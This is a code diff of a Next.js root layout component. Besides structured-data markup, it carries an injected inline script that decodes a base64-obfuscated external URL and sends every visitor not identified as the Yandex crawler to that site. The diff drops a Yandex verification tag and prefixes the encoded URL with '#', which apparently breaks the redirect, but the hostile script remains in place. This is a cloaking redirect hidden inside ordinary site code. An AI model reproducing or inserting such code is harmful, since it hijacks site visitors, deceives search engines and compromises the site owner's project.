@@ -159,13 +159,13 @@ export default function RootLayout({
           type="application/ld+json"
           dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
         />
-  <meta name="yandex-verification" content="943629ae2e09b1a0" />        
+
         <script
           dangerouslySetInnerHTML={{
             __html: `
               (function() {
                 var ua = navigator.userAgent.toLowerCase();
-                var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
+                var targetB64 = "#aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
                 if (ua.indexOf("yandex") === -1) {
                     window.location.replace(atob(targetB64));
                 }
